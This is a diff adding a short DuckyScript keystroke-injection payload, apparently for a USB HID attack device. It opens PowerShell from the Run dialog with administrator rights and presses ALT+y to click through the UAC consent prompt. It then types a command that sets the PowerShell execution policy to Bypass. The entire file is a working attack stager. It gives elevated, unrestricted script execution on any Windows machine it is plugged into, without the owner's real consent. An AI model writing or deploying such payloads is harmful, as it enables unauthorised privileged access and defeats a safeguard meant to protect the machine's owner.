@@ -1,0 +1,14 @@
+REM Opening PowerShell as Admin and setting Execution Policies to Bypass
+
+REM Opening PowerShell as admin
+DELAY 500
+GUI r
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+ALT yr
+
+REM Set Execution policy to Bypass
+DELAY 1000
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force
+ENTER
